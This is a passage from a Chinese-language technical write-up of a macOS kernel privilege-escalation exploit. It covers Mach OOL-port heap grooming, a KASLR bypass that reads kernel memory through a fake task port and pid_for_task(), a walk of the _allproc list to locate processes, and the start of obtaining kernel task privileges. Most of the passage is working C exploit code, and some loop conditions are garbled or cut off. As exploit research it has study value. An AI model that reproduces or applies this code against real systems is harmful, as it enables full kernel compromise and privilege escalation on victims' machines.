            kern_return_t recv_result = mach_msg(&recv_msg.msg_head, MACH_RCV_MSG | MACH_MSG_OPTION_NONE, 0, sizeof(struct ool_recv_msg), ool_ports[current_port_num], MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
            if(recv_result != KERN_SUCCESS){
                printf("[-] Error in OOL Fengshui recvnError : %sn", mach_error_string(recv_result));
                exit(1);
            }
        }
        /* RE-SEND MSG */
        for(current_port_num = USE_PORT_START; current_port_num  %llxn", i, k, tmp_port[0]);
                    return tmp_port[0];
                }
            }
        }
        printf("[-] Error in Find Manipulated Portn");
        exit(1);
    }
**  
**
**（4）获取内核地址**
在 macOS 中, 内存保护技术使用 KASLR 随机化内核地址。因此，如果您有一个端口地址并且可以执行任意操作，则可以使用
clock_sleep_trap() 将 clock_list 动态加载到内核中。
使用的代码如下:
    uint64_t get_clock_list_addr(uint64_t fake_port, mach_port_t* manipulated_port){
        for(uint64_t guess_clock_addr = 0xffffff8000200000; guess_clock_addr  0xffffff8000200000; current_addr-=0x4000) {
            int32_t kernel_data = 0;
            *(uint64_t*) (fake_task + TASK_INFO_GAP) = current_addr - 0x10;
            pid_for_task(manipulated_port, &kernel_data);
            if (kernel_data == 0xfeedfacf) {
                printf("[+] Found kernel_text addr : %llxn", current_addr);
                return current_addr;
            }
        }
    }
由于内核地址在 0x40000 处对齐，所以需要删除时钟列表的低 14 位，然后再减去对齐的大小并进行比较。此时，我们使用 pid_for_task()
在用户级读取内核的内存。通常，因为你无法再用户模式下读取内核内存，所以一个技巧是，通过使用你拥有的端口来调用 pid_for_task() 来读取内核内存。
pid_for_task() 函数通过从原始 Mach 任务中获取 BSD 进程的 ID 作为参数，定义如下。[bsd/vm/vm_unix.c]
    kern_return_t
    pid_for_task(
        struct pid_for_task_args *args)
    {
        mach_port_name_t    t = args->t;
        user_addr_t        pid_addr  = args->pid;  
        proc_t p;
        task_t        t1;
        int    pid = -1;
        kern_return_t    err = KERN_SUCCESS;
        AUDIT_MACH_SYSCALL_ENTER(AUE_PIDFORTASK);
        AUDIT_ARG(mach_port1, t);
        t1 = port_name_to_task(t);
        if (t1 == TASK_NULL) {
            err = KERN_FAILURE;
            goto pftout;
        } else {
            p = get_bsdtask_info(t1);
            if (p) {
                pid  = proc_pid(p);
                err = KERN_SUCCESS;
            } else if (is_corpsetask(t1)) {
                pid = task_pid(t1);
                err = KERN_SUCCESS;
            }else {
                err = KERN_FAILURE;
            }
        }
        task_deallocate(t1);
    pftout:
        AUDIT_ARG(pid, pid);
        (void) copyout((char *) &pid, pid_addr, sizeof(int));
        AUDIT_MACH_SYSCALL_EXIT(err);
        return(err);
    }
也就是说，可以使用 get_bsdtask_info(t1) 读取内核内存，并使用 proc_pid() 读取 PID 值。
**  
**
**（5）查找当前进程和内核进程**
在 macOS 中，所有当前正在运行的进程的信息都存储在 _allproc 中。
    extern struct proclist allproc; /* List of all processes. */
_allproc 将进程链接到链表结构中，并且可以通过 nm /mach_kernel|grep allproc 命令获取偏移量。
下面是 proc 的结构信息。[bsd/sys/proc_internal.h]
    struct    proc {
        LIST_ENTRY(proc) p_list;        /* List of all processes. */
        pid_t        p_pid;            /* Process identifier. (static)*/
        void *         task;            /* corresponding task (static)*/
        struct    proc *    p_pptr;             /* Pointer to parent process.(LL) */
        pid_t        p_ppid;            /* process's parent pid number */
        pid_t        p_pgrpid;        /* process group id of the process (LL)*/
        uid_t        p_uid;
        gid_t        p_gid;
        uid_t        p_ruid;
        gid_t        p_rgid;
        uid_t        p_svuid;
        gid_t        p_svgid;
        uint64_t    p_uniqueid;        /* process unique ID - incremented on fork/spawn/vfork, remains same across exec. */
        uint64_t    p_puniqueid;        /* parent's unique ID - set on fork/spawn/vfork, doesn't change if reparented. */
        lck_mtx_t     p_mlock;        /* mutex lock for proc */
        char        p_stat;            /* S* process status. (PL)*/
        char        p_shutdownstate;
        char        p_kdebug;        /* P_KDEBUG eq (CC)*/ 
        char        p_btrace;        /* P_BTRACE eq (CC)*/
        LIST_ENTRY(proc) p_pglist;        /* List of processes in pgrp.(PGL) */
        LIST_ENTRY(proc) p_sibling;        /* List of sibling processes. (LL)*/
        LIST_HEAD(, proc) p_children;        /* Pointer to list of children. (LL)*/
        TAILQ_HEAD( , uthread) p_uthlist;     /* List of uthreads  (PL) */
        LIST_ENTRY(proc) p_hash;        /* Hash chain. (LL)*/
        TAILQ_HEAD( ,eventqelt) p_evlist;    /* (PL) */
    #if CONFIG_PERSONAS
        struct persona  *p_persona;
        LIST_ENTRY(proc) p_persona_list;
    #endif
        lck_mtx_t    p_fdmlock;        /* proc lock to protect fdesc */
        lck_mtx_t     p_ucred_mlock;        /* mutex lock to protect p_ucred */
        /* substructures: */
        kauth_cred_t    p_ucred;        /* Process owner's identity. (PUCL) */
        struct    filedesc *p_fd;            /* Ptr to open files structure. (PFDL) */
        struct    pstats *p_stats;        /* Accounting/statistics (PL). */
        struct    plimit *p_limit;        /* Process limits.(PL) */
        struct    sigacts *p_sigacts;        /* Signal actions, state (PL) */
         int        p_siglist;        /* signals captured back from threads */
        lck_spin_t    p_slock;        /* spin lock for itimer/profil protection */
    ...
你可以实际追踪一下像 pid_for_task() （获取PID）这样的进程，并找到具有所需 PID 的进程。
使用的代码如下：
    uint64_t get_proc_addr(uint64_t pid, uint64_t kernel_addr, void* fake_task, mach_port_t* manipulated_port){
        uint64_t allproc_real_addr = 0xffffff8000ABB490 - 0xffffff8000200000 + kernel_addr;
        uint64_t pCurrent = allproc_real_addr;
        uint64_t pNext = pCurrent;
        while (pCurrent != NULL) {
            int nPID = 0;    
            *(uint64_t*) (fake_task + TASK_INFO_GAP) = pCurrent;
            pid_for_task(manipulated_port, (int32_t*)&nPID);
            if (nPID == pid) {
                return pCurrent;
            }
            else{
                *(uint64_t*) (fake_task + TASK_INFO_GAP) = pCurrent - 0x10;
                pid_for_task(manipulated_port, (int32_t*)&pNext);
                *(uint64_t*) (fake_task + TASK_INFO_GAP) = pCurrent - 0x0C;
                pid_for_task(manipulated_port, (int32_t*)(((uint64_t)(&pNext)) + 4));
                pCurrent = pNext;
            }
        }
    }
**  
**
**（6）获取内核权限（AAR/AAW）**
为了提升权限，内核进程必须获取的信息是端口特权和内核 task。
使用的代码如下：
    dumpdata* get_kernel_priv(uint64_t kernel_process, uint64_t* fake_port, void* fake_task, mach_port_t* manipulated_port){
        dumpdata* data = (dumpdata *)malloc(sizeof(dumpdata));
        data->dump_port = malloc(0x1000);
        data->dump_task = malloc(0x1000);
        uint64_t kern_task = 0;
        *(uint64_t*) (fake_task + TASK_INFO_GAP) = (kernel_process + 0x18) - 0x10 ;
        pid_for_task(manipulated_port, (int32_t*)&kern_task);